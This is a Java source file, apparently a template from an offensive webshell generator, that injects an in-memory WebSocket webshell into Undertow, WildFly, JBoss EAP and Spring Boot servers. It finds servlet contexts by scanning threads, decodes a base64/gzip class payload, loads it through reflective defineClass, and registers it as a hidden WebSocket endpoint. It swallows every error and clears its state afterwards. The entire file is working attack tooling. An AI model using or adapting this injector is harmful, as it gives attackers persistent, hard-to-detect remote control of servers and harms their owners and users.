package org.leo.jmg.mem.injectortpl.undertow;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * Undertow WebSocket 内存马注入器。
 * <p>
 * Context 发现逻辑复用 {@link UndertowFilterInjector}，通过 ServletContext
 * 获取 ServerContainer 并 addEndpoint。
 * <p>
 * 适用于 Undertow 独立运行和 Spring Boot 内嵌 Undertow。
 * JBoss EAP 7+ / WildFly 使用 Undertow 作为 Web 容器，同样适用。
 */
public class UndertowWebSocketInjector {

    private static boolean ok;
    private static String urlPattern;
    private static String shellClassName;
    private static String shellClass;

    public UndertowWebSocketInjector() {
        if (ok) {
            return;
        }
        Set<Object> contexts = null;
        try {
            contexts = getContext();
        } catch (Throwable throwable) {
            contexts = null;
        }
        if (contexts != null && !contexts.isEmpty()) {
            for (Object context : contexts) {
                try {
                    Object shell = getShell(context);
                    inject(context, shell);
                } catch (Throwable ignored) {
                }
            }
        }
        ok = true;
        shellClass = null;
        shellClassName = null;
        urlPattern = null;
    }

    /**
     * Context 发现逻辑与 UndertowFilterInjector 一致。
     * 通过 ServletRequestContext.current() 获取当前 ServletContext。
     */
    @SuppressWarnings("Duplicates")
    public Set<Object> getContext() throws Exception {
        Set<Object> contexts = new HashSet<Object>();
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            try {
                Class<?> clazz = thread.getContextClassLoader()
                        .loadClass("io.undertow.servlet.handlers.ServletRequestContext");
                Object requestContext = invokeMethod(clazz, "current", null, null);
                Object servletContext = invokeMethod(requestContext, "getCurrentServletContext", null, null);
                if (servletContext != null) {
                    contexts.add(servletContext);
                }
            } catch (Exception ignored) {
            }
        }
        return contexts;
    }

    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
        } catch (Exception e) {
            Object deploymentInfo = getFieldValue(context, "deploymentInfo");
            return ((ClassLoader) invokeMethod(deploymentInfo, "getClassLoader", null, null));
        }
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        ClassLoader classLoader = getWebAppClassLoader(context);
        Class<?> clazz;
        try {
            clazz = classLoader.loadClass(shellClassName);
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        }
        return clazz.newInstance();
    }

    /**
     * Undertow 的 context 已是 ServletContext，
     * 直接获取 ServerContainer 并注册 Endpoint。
     */
    public void inject(Object context, Object shell) throws Exception {
        Object servletContext = context;
        Object container = invokeMethod(servletContext, "getAttribute",
                new Class[]{String.class}, new Object[]{"javax.websocket.server.ServerContainer"});
        if (container == null) {
            container = invokeMethod(servletContext, "getAttribute",
                    new Class[]{String.class}, new Object[]{"jakarta.websocket.server.ServerContainer"});
        }
        if (container == null) {
            throw new RuntimeException("ServerContainer is null, WebSocket support may not be enabled");
        }

        ClassLoader contextClassLoader = getWebAppClassLoader(context);
        Class<?> serverEndpointConfigClass;
        Class<?> builderClass;
        try {
            serverEndpointConfigClass = contextClassLoader.loadClass("javax.websocket.server.ServerEndpointConfig");
            builderClass = contextClassLoader.loadClass("javax.websocket.server.ServerEndpointConfig$Builder");
        } catch (ClassNotFoundException e) {
            serverEndpointConfigClass = contextClassLoader.loadClass("jakarta.websocket.server.ServerEndpointConfig");
            builderClass = contextClassLoader.loadClass("jakarta.websocket.server.ServerEndpointConfig$Builder");
        }
        Constructor<?> constructor = builderClass.getDeclaredConstructor(Class.class, String.class);
        constructor.setAccessible(true);
        Object builder = constructor.newInstance(shell.getClass(), urlPattern);
        Object endpointConfig = invokeMethod(builder, "build", null, null);

        try {
            invokeMethod(container, "addEndpoint", new Class[]{serverEndpointConfigClass}, new Object[]{endpointConfig});
        } catch (Exception e) {
            // 已注册或路径冲突，忽略
        }
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
        for (Class<?> clazz = obj.getClass(); clazz != Object.class; clazz = clazz.getSuperclass()) {
            try {
                Field field = clazz.getDeclaredField(name);
                field.setAccessible(true);
                return field.get(obj);
            } catch (NoSuchFieldException ignored) {
            }
        }
        throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException("Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }
}
